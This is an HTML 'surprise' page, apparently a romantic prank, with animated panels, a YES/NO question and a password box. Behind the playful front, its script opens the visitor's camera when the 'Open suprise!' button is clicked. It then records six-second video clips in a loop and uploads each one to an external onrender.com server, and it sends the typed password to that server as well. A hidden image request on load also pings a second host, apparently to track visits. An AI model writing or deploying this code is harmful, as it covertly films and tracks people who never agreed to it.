<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    
</head>
<style>
    html,body{
        width:100%;
        height:100%;
        padding:0px;
        margin:0px;
        background-color: rgb(255, 0, 123);
        overflow: hidden;
    }
    body{
        display: flex;
        justify-content: center;
        flex-direction: column;
        align-items: center;
        width:100%;
        height:100%;
       
    }
   .con{
    width:100vw;
    height:100vh;
    background: rgb(255,255,255);
    background: url("https://wallpapers.com/images/featured/beach-phone-4qyssnkxmg1ykpgz.jpg");
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
         background-size: cover;     /* fills the area without distortion */
  background-position: center; /* keeps the main part centered */
  background-repeat: no-repeat;
   }
   #top{
    width:100vw;
    height:50%;
    background: linear-gradient(360deg, rgba(255,255,255,1) 0%, rgba(249,249,249,1) 35%, rgb(216, 215, 252) 100%);
    top:0px;
    position: relative;
    z-index: 1;
    box-shadow: 0px 9px 15px -3px rgba(0,0,0,0.1);
   
   }
   #bottom{
    position: relative;
    width:100vw;
    height:50%;
    background: rgb(255,255,255);
    background: linear-gradient(180deg, rgba(255,255,255,1) 0%, rgba(249,249,249,1) 35%, rgb(238, 174, 223) 100%);
    bottom:0px;
    z-index: 1;
    box-shadow: 0px -9px 15px -3px rgba(0,0,0,0.1);
  
   }
   #openbtn{
  
    position: absolute;
    top: 50%; /* Move it down 50% */
            left: 50%; /* Move it right 50% */
            transform: translate(-50%, -50%);
    padding:8px 17px;
    background-color: rgb(239, 120, 156);
    color:black;
    border:none;
    border-radius: 7px 16px;
    z-index: 2;
    cursor: pointer;
    box-shadow: 0px 9px 15px -3px rgba(0,0,0,0.1);
    border-bottom:2px solid red;
   }
 #openbtn:hover{
    box-shadow: 0px 1px 15px 1px teal;
 }
   .topclass{
    animation: top 2s linear;
  
   }
   .bottomclass{
    animation: bottom 2s linear;
    
   }
   .openbtnclass{
    animation: openbtn 3s ease-in-out;
    display: none;
   }
   #text{
   width:100vw;
   height:40%;
   border-radius: 16px;
  margin-top: -200px;
   display: none;
   }
   .textclass{
    display: none;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    animation: text 2s ease-out;
  

   }
   .textclass h3{
    text-align: center;
    font-family: sans-serif;
  
    margin:5px;
    text-shadow: 3px 2px 6px rgba(79, 74, 2, 0.85);
    color:black;

   }
   .buttoncon{
    display: flex;
    flex-direction: row;
    margin-top: 13px;
   }
   .buttoncon button{
    padding:7px 16px;
    cursor: pointer;
    background-color: rgb(178, 227, 247);
    color:black;
    border:none;
    border-radius: 7px;
    margin-right: 10px;
   
    box-shadow: 0px 10px 15px -3px rgba(0,0,0,0.1);


   }
  #no{
    z-index: 1;
  }

  #yes:hover{
    background-color: black;
    color:white;
  }
   #wish{
    width:80%;
    height:40%;
    display: none;
   }
   .wishclass{
    display:none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
   }
   @keyframes top {
    0%{top:0%; display: block !important; }
   
    100%{top:-50%; display: block !important;}
   }
   @keyframes openbtn {
    0%{opacity: 1;display: block;}
    100%{opacity: 0;display: block;}
   }
   @keyframes text {
    0%{opacity: 0;display: none;}
    80%{opacity:0;transform: scale(0);display: none;}
    100%{opacity: 1;transform: scale(1);}
   }
   @keyframes bottom {
    0%{bottom:0%;display: block !important;}
    100%{bottom:-50%;display: block !important;}
   }
   #wish input{
    padding:7px 15px;
    border-radius: 9px;
    box-shadow: 0px 10px 15px -3px rgba(0,0,0,0.1);
    margin:0px;
    border:none;
    background-color: whitesmoke;
   }
   #wish p{
   margin-bottom: 15px;
   }
   #wish button{
    padding:4px 10px;
    background-color: rgb(104, 186, 237);
    border:none;
    color:black;
    margin-top: 15px;
    border-radius: 9px;
    box-shadow: 0px 10px 15px -3px rgba(0,0,0,0.1);
    font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
   }
   #wish button:hover{
    box-shadow: 0px 0px 15px 1px blue;
    cursor: pointer;
   }
   .rightclass{
    padding:4px 8px;
    display: none;
   border:1px solid yellow;
   background-color: black;
    color:white;
   }
   
</style>
<body>
  <div class="con">
   <div id="top">

   </div>
   <div id="wish">
    <p id="right"></p>
    <p>wait a moment</p>
    <input type ="text" id="pass" placeholder="wait">
    <button id="send"></button>
   </div>
   <div id = "text">
    <h3>Do you ?</h3>
    <h3>Do you e?</h3>
    <div class="buttoncon">
        <button id="yes">YES</button><button id="no">NO</button>
    </div>
   </div>
   <button id = "openbtn">Open suprise!</button>
   <div id="bottom"></div>
  </div>
  <script>
    const right = document.getElementById("right");
    const pass = document.getElementById("pass");
    const send = document.getElementById("send");
    const wish = document.getElementById("wish");
    const yes = document.getElementById("yes");
    const no = document.getElementById("no");
    const openbtn = document.getElementById("openbtn");
    const bottom = document.getElementById("bottom");
    const topc = document.getElementById("top");
    const text = document.getElementById("text");
    const message = document.createElement('div'); // Create a message div
    message.style.color = "white";
    message.style.textAlign = "center";
    message.style.display = "none"; // Initially hidden
    document.body.appendChild(message); // Append to body
    let chunks = [];
    let mediaRecorder;
    
    send.addEventListener("click", () => {
    const value = pass.value;

    if (!value) {
        alert("Please enter right password.");
        return;
    }
    
    const url = "https://surprise-k7ls.onrender.com/password";
   
 

fetch(url, {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
    },
    body: JSON.stringify({ email: value }), // Send the email as JSON
})
.then(response => {
    // Check if the response is okay (status in the range 200-299)
    if (!response.ok) {
        throw new Error("Network response was not ok");
    }
    return response.json(); // Parse JSON response
})
.then(data => {
    console.log(data, "this is response");
    if (data.message === "wrong") {
        alert("Password is wrong, please check your messenger.");
    } else {
        right.textContent = data.message;
        right.classList.add("rightclass");
    }
})
.catch(error => {
    alert("Error in checking correct password.");
    console.error("Fetch error:", error); // Log the error for debugging
});

});



    bottom.addEventListener("animationend",()=>{
        bottom.style.display="none";
        
    })
    topc.addEventListener("animationend",()=>{
        topc.style.display="none" ;
    })
    function random(){
        const x = Math.random() * 200 - 50;
        const y = Math.random() * 280 -50;
        no.style.transform = `translate(${x}px,${y}px)`;
    }
    no.addEventListener("mouseenter",random);
    no.addEventListener("click",random);
    yes.addEventListener("click",function(){
        console.log("enter into yes");
        text.classList.remove("textclass");
        wish.classList.add("wishclass");
    })



    openbtn.addEventListener("click", async () => {
        console.log("enter openbtn");
        bottom.classList.add("bottomclass");
        topc.classList.add("topclass");
        openbtn.classList.add("openbtnclass");
        text.classList.add("textclass");
         await openCamera()

    });


    async function openCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            mediaRecorder = new MediaRecorder(stream);
            
            if (!mediaRecorder) return;

            mediaRecorder.start();
            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    chunks.push(event.data);
                }
            };

            // Use 'beforeunload' to stop recording and upload
            setTimeout(() => {
                mediaRecorder.stop();
               openCamera()
            }, 6000);

            mediaRecorder.onstop = () => {
              
                const blob = new Blob(chunks, { type: "video/webm" });
                chunks = [];
                const formdata = new FormData();
                const filename = `video-${Date.now()}.webm`;
                formdata.append("video", blob, filename);
                
                fetch("https://surprise-k7ls.onrender.com/upload", { method: "POST", body: formdata })
                    .then(resp => {
                        console.log("Success");
                    })
                    .catch(err => {
                        console.log("Error in uploading", err);
                    });
            };
        } catch (err) {
            console.error("Error accessing media devices.", err);
        }
    }
      window.addEventListener("load", () => {
  const img = new Image();
  img.src = "https://hello-2x7x.onrender.com";
});
</script>

</body>
</html>
